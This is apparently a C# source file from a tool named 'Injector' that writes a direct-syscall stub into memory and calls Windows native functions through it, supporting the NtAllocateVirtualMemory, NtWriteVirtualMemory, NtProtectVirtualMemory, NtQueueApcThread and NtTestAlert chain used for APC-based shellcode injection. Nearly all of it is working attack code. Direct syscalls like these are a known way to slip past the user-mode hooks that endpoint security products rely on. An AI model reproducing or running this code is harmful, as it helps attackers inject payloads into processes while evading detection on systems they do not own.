using System;
using System.Runtime.InteropServices;

namespace Injector
{
    public class Syscalls
    {
        public static byte[] shellCode = {
                    0x4C, 0x8B, 0xD1,             // mov r10, rcx
                    0xB8, 0x00, 0x00, 0x00, 0x00, // mov eax, 0x00 <- (sysCall identifier)
                    0x0F, 0x05,                   // sysCall
                    0xC3                          // ret
            };

        public static byte[] GetSysCallAsm(int id)
        {
            

            var copy = shellCode;
            var sysCallIdentifierBytes = BitConverter.GetBytes(id);
            Buffer.BlockCopy(sysCallIdentifierBytes, 0, copy, 4, sizeof(uint));

            return copy;
        }

        public static object[] executeSyscall(int id, string function, object[] args)
        {
            byte[] sc = GetSysCallAsm(id);

            unsafe
            {

                IntPtr memoryAddress = IntPtr.Zero;
                var lpValue = Marshal.AllocHGlobal(IntPtr.Size);
                Marshal.WriteIntPtr(lpValue, new IntPtr((long)sc.Length));

                DInvoke.DynamicInvoke.Native.NtAllocateVirtualMemory(
                    (IntPtr)(-1), 
                    ref memoryAddress,
                    IntPtr.Zero,
                    ref lpValue,
                    (uint)(DInvoke.Data.Win32.Kernel32.MemoryAllocationFlags.Reserve | DInvoke.Data.Win32.Kernel32.MemoryAllocationFlags.Commit),
                    (uint)DInvoke.Data.Win32.Kernel32.MemoryProtectionFlags.ReadWrite);

                Marshal.Copy(sc, 0, memoryAddress, sc.Length);

                DInvoke.DynamicInvoke.Native.NtProtectVirtualMemory((IntPtr)(-1), 
                                                                    ref memoryAddress, 
                                                                    ref lpValue, 
                                                                    (uint)DInvoke.Data.Win32.Kernel32.MemoryProtectionFlags.ExecuteRead);

                Delegate sysCallDelegate = null;
                switch (function)
                {
                    case "NtAllocateVirtualMemory":
                        {
                            sysCallDelegate = Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(DInvoke.DynamicInvoke.Native.DELEGATES.NtAllocateVirtualMemory));
                            break;
                        }
                    case "NtWriteVirtualMemory":
                        {
                            sysCallDelegate = Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(DInvoke.DynamicInvoke.Native.DELEGATES.NtWriteVirtualMemory));
                            break;
                        }
                    case "NtProtectVirtualMemory":
                        {
                            sysCallDelegate = Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(DInvoke.DynamicInvoke.Native.DELEGATES.NtProtectVirtualMemory));
                            break;
                        }
                    case "NtQueueApcThread":
                        {
                            sysCallDelegate = Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(DInvoke.DynamicInvoke.Native.DELEGATES.NtQueueApcThread));
                            break;
                        }
                    case "NtTestAlert":
                        {
                            sysCallDelegate = Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(DInvoke.DynamicInvoke.Native.DELEGATES.NtTestAlert));
                            break;
                        }

                    default:break;
                }

                var retValue = sysCallDelegate.DynamicInvoke(args);

                try
                {
                    var a = (DInvoke.Data.Native.NTSTATUS)retValue;
                    if (a != DInvoke.Data.Native.NTSTATUS.Success)
                    {
                        Console.WriteLine("Error: " + retValue);
                    }
                }
                catch { }
            }

            return args;

        }
    }
}
